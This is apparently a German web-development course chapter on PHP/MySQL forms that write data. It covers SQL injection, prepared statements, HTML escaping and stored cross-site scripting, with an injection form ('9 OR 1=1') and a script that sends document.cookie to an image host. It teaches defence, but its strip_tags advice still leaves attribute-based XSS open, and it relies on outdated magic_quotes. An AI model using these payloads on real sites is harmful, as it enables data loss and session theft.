---
title: Web-Applikation mit Schreibrecht
order: 20
---
Hier der Plan für die einzelnen Seiten dieser Applikation:

| Titel           | Dateiname       |  Methode / Parameter |  Beschreibung                                |
| Person löschen  | delete.php      |  POST pid            |  Löscht die Person mit der angegeben pid.    |
| Person einfügen | person_new.php  |  GET                 |  Zeigt Eingabeformular für eine neue Person  |
| Person einfügen | person_new.php  | POST uid,vorname,nachname, profil,mail,web, blog,feed,title, isfemale,ifshow | Legt eine neue Person an. |
| Person bearbeiten | person_edit.php | GET pid |  Zeigt Bearbeitungs-Formuar an |
| Person bearbeiten | person_edit.php | POST pid, vorname, nachname, profil |  Speichert neue Daten zur Person pid |
{: class="table table-condensed table-bordered" style="width:auto"}



Daten löschen
---------------
Das Löschen könnte so einfach sein: Ein Programm mit namen delete.php, das als Parameter die id der Person erhält, die gelöscht werden soll:

<php>
$pid   = $_POST['pid'];
$dbh->query("DELETE FROM person WHERE pid=$pid" );
</php>

Dieses Programm ist anfällig für folgende Attacke: Ein Aufruf mit einem selbst gebastelten Formular setzt den Parameter pid auf Wert „9 OR 1=1“

<htmlcode>
<form method="post" action="delete.php" >
    <input type="hidden" value="9 OR 1=1" name="pid"/>
    <input type="submit" value="del all"/>
</form>
</htmlcode>

Das führt dazu, dass folgendes SQL-Statement ausgeführt wird:

<sql>
DELETE FROM person WHERE pid=9 OR 1=1
</sql>

Und dieses Statement löscht nicht einen Datensatz sondern alle Datensätze. Diese Art von Attacke auf eine Web-Applikation nennt man „SQL Injection“.

### SQL Injection verhindern
Dieses Problem kann vermeiden indem man die Eingabe genau überprüft. In diesem Beispiel also: nur wenn es sich bei pid um eine ganze Zahl handelt, darf sie verwendet werde. Das wird hier mit einer Regular Expression (die Sie noch nicht verstehen müssen) überprüft:

<php>
if( ! preg_match( '/^\d+$/', $pid ) ) {
    error_log("hack: $pid statt id in delete.php.");
    echo("Hack detected. Please stay at you computer until the police arrive.");
    exit;
}
</php>

Der zweite Ansatz ist die Verwendung von „Prepared Statements“ in der Datenbank. Dabei wird der SQL-Interpreter der Datenbank gänzlich umgangen. 

Als erster Schritt wird mit prepare ein SQL-Statement mit Fragenzeichen als Platzhalter vorbereitet. (Dieses SQL-Statement wird am Server schon mal geparsed und compiliert.) Mit execute wird das Statement ausgeführt, dabei werden die Platzhalter durch echte Daten ersetzt.  Das schöne dabei: es wird nie ein SQL-Statement als String gebaut, sondern die einzufügenden Daten werden binär an den Datenbankserver übertragen. Darin enthaltene SQL-Fragement können keinen Schaden anrichten.

<php>
$sth = $dbh->prepare("DELETE FROM person WHERE pid = ?");
$sth->execute(array($pid));
</php>

`execute` kann auch mehrfach ausgeführt werden, das ist effektiver als eine normales query zu wiederholen.

### Authorisierung nicht vergessen!
Wir haben eine Sicherheitslücke geschlossen, aber es bleibt trotzdem noch viel zu tun: Löschen, Einfügen, Bearbeiten soll nur nach dem Login möglich sein!

Daten einfügen
----------------
Hier das einfachste Programm, das ein neues Werk speichert:

<php>
mysqli_query( $db, "INSERT INTO werk (titel) VALUES ('$_POST[titel]')" );
</php>

Das funktioniert für viele Eingaben, aber was passiert wenn ein Werk den Titel „That’s it“ haben soll? Dann wird folgendes SQL-Statement ausgeführt:

<sql>
INSERT INTO werk (titel) VALUES ('That's it')
</sql>

Das kann nicht funktionieren. Für dieses Problem gibt es in PHP eine einfache und falsche Lösung:

Normalerweise verändert PHP automatisch alle Daten die über GET, POST  und Cookies hereinkommen: vor alle Anführungszeichen wird ein Backslash eingefügt.  Aus „That's it“ wird also automatisch „That\'s it“ , das SQL-Statement funktioniert wieder:

<sql>
INSERT INTO werk (titel) VALUES ('That\'s it')
</sql>

Diese Automatik ist unter dem Namen „magic_quotes“ bekannt und kann in der Apache- oder PHP-Konfiguration abgeschalten14 werden. Auf dem MMT-Server ist sie generell ausgeschalten. Sie sollten das auf Ihrem lokalen Apache-Server auch tun:

<code>
php_flag magic_quotes_gpc off
</code>

Mit folgendem Programm können Sie testen ob auf dem Server magic quotes ein- oder ausgeschalten sind:

<php>
echo( (get_magic_quotes_gpc() ? "mit magic quotes" : "ohne magic quotes") );
echo("<pre>");
print_r($_POST);
echo("</pre>");
</php>

In Wirklichkeit kann man Sie nicht ganz abschalten[&rarr;](http://at.php.net/manual/de/security.magicquotes.disabling.php), aber das ignorieren wir besser. Das Problem betrifft nur Array-Parameter.
Wenn die magic quotes abgeschalten sind kann man das SQL-Problem besser lösen: mit prepared Statements. Hier am Beispiel eines neuen Werkes:

<php>
$sth = $dbh->prepare(
  "INSERT INTO person 
    (uid,vorname,nachname, profil,mail,web, blog,feed,title, isfemale,ifshow) 
      VALUES 
    (?,?,?,?,?,?,?,?,?,?,?)");
                  
$sth->execute(
        array(
          $_POST['uid'],
          $_POST['vorname'],
          $_POST['nachname'],
          $_POST['profil'],
          $_POST['mail'],
          $_POST['web'],
          $_POST['blog'],
          $_POST['feed'],
          $_POST['title'],
          $_POST['isfemale'],
          $_POST['ifshow']
        )
      );
// noch ohne Fehlerbehandlung
</php>

Beim Einfügen in die Personen-Tabelle kann es leicht zu Problemen kommen:  die Tabelle verlangt in 3 Spalten einen eindeutigen Eintrag, wenn man hier einfach nichts eingibt gibt das einen Fehler.

So weit sollten Sie es nicht kommen lasse: Sie sollten die Eingaben aus dem Webformular schon vor dem INSERT prüfen und dann ausführliche, vollständige, deutsche Fehlermeldungen ausgeben.

![Abbildung 149: Fehlermeldung der Datenbank vs. selbst gestaltete Fehlermeldung](/images/image367.png)

Falls das Einfügen der Daten funktioniert hat und in der Tabelle ein autoincrement-Feld als Primärschlüssel vorhanden ist, kann man den Wert des Schlüssels im neuen Datensatz auslesen und weiter verwenden:

      $pid = $dbh->lastInsertId(); 
      header("Location: person.php?pid=$pid");

Auch hier ist eine Weiterleitung direkt nach dem POST-Request sinnvoll: nach dem Einfügen des Datensatzes wird direkZZt auf die Anzeige des neuen Datensatzes weitergeleitet. Falls man danach auf „Reload“ drückt wird der Datensatz neu angezeigt, aber keinesfalls ein zweites Mal eingefügt.

Einen Datensatz bearbeiten
---------------------------
Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.

![Abbildung 150: Formular zum Bearbeiten einer Person](/images/image368.png)

Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement:

<php>
$sth = $dbh->prepare("SELECT pid,vorname,nachname,profil FROM person WHERE pid = :pid");
$sth->bindValue(':pid', $_GET['pid'], PDO::PARAM_INT);
$sth->execute();
$person=$sth->fetchObject();
</php>

Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute und bei Textareas als Inhalt des Tags:

<htmlcode>
  <input name="vorname" value="Tobias">
  <textarea name="profil" rows="7">Webdesigner und Programmierer.</textarea>
</htmlcode>

Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein Beispiel in MySQL:

<sql>
mysql> select vorname,profil from person where pid=538;
+---------------------+-----------------------------+
| vorname             | profil                      |
+---------------------+-----------------------------+
| Tobias "the coder"  | Mein Lieblings-Tag: <style> |
+---------------------+-----------------------------+
1 row in set (0.00 sec)
</sql>

So würde die Darstellung der Eingabefelder nicht funktionieren:

<htmlcode>
  <input name="vorname" value="Tobias "the coder" " />
  <textarea name="profil" rows="7">Mein Lieblings-Tag: <style></textarea>
</htmlcode>

Richtig ist die Darstellung gewisser Zeichen als HTML entities:

<htmlcode>
  <input name="vorname" value="Tobias &quot;the coder&quot; " />
  <textarea name="profil" rows="7">Mein Lieblings-Tag: &lt;style&gt;</textarea>
</htmlcode>

Diese Ersetzung wird mit der Funktion htmlspecialchars vorgenommen:

<php>
$person->vorname  = htmlspecialchars( $person->vorname  );
</php>

Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:

<php>
// $pid  muss man nicht escapen, das ist blos ein integer
    $person->vorname  = htmlspecialchars( $person->vorname  );
    $person->nachname = htmlspecialchars( $person->nachname );
    $person->profil   = htmlspecialchars( $person->profil   );

include "header.php";
?>
<form action="person_edit.php" method="post">
<input type="hidden" name="pid" value="<?= $person->pid ?>" />
<p><label class="leftcol" for="vorname">Vorname</label>   
   <input name="vorname" value="<?= $person->vorname ?>" /></p>
<p><label class="leftcol" for="nachname">Nachname</label> 
   <input  name="nachname" value="<?= $person->nachname ?>" /></p>
<p><label class="leftcol" for="profil">Profil</label>     
   <textarea name="profil" rows="7" cols="40" ><?= $person->profil ?></textarea></p>
<p><span class="leftcol"></span><input type="submit" value="speichern" /></p>
</form>
</php>

Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:

<php>
if( $_POST['pid'] ) {
  $sth = $dbh->prepare( "UPDATE person SET vorname = ?, nachname = ?, profil = ?  WHERE pid=?");
  $sth->execute(array(
    $_POST['vorname'],
    $_POST['nachname'],
    $_POST['profil'],
    $_POST['pid']
  ));
  header("Location: person.php?pid=$_POST[pid]");
  exit;
}
</php>

Escapen von HTML
-----------------
Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank zu müssen. Also auch schon in Kapitel 6.3 beim Anzeigen der Daten. Damals haben wir einfach die Daten direkt mit echo ausgegeben:

<php>
<?= $anrede ?>
<?= $person->vorname ?>
<?= $person->nachname ?>
hat insgesamt  <?= $werks_anz ?> Werke in dieser Datenbank.
</php>

Wenn hier im Profil wieder „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.

<php>
$bildpfad  = htmlspecialchars( $person['bildpfad'] );
$uid       = htmlspecialchars( $person['uid'     ] );
$vorname   = htmlspecialchars( $person['vorname' ] );
$nachname  = htmlspecialchars( $person['nachname'] );
$profil    = htmlspecialchars( $person['profil'  ] );

echo <<<EOM
    <p><img src="http://multimediaart.at/media/profil/$bildpfad" style="float:right" />
    $anrede $vorname $nachname hat insgesamt x Werke in dieser Datenbank.
    $ersie hat den Usernamen $uid.</p>

    <div>$profil</div>
EOM;
</php>

Damit funktioniert nun die Darstellung des Datensatzes richtig:

![Abbildung 151: Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen](/images/image369.png)

 Darstellen von HTML
---------------------
Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags wieder anzeigen?

### Gefahren
Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:

<htmlcode>
<img src="http://laucher.net/bild.php?woher=gaestebuch_mmt" alt="harmloses bild" />
</htmlcode>

Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch identifizieren.

Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen: Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer Vorherigen Suche noch ein Cookie haben.)

Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:

<htmlcode>
Hallo Welt 

<img src="http://users.local/bild.php" alt="harmloses bild" id="hack_tool" />
<script>
   document.getElementById("hack_tool").src += "?keks=" + document.cookie;
</script>
</htmlcode>

Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:

<htmlcode>
<img id="hack_tool" alt="harmloses bild" src="http://users.local/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115"/>
</htmlcode>

So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!

Lassen Sie niemals, niemals, niemals zu, dass Fremde Javascript in Ihre Site einspeisen können!

Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und „wirkt nicht“:


![Abbildung 152: Eingegebener HTML+Javascript-Code wird escaped und dargestellt](/images/image370.png)

### Sichere Eingabe von HTML
Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags &lt;p&gt; und &lt;b&gt; verwendet werden können, mehr nicht. Dass es nur diese Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher gestellt:

<php>
$profil = strip_tags( $_POST['profil'], "<p><b>" );
</php>

Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen verzichten:

Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE16 erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:

![Abbildung 153: Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden](/images/image371.png)



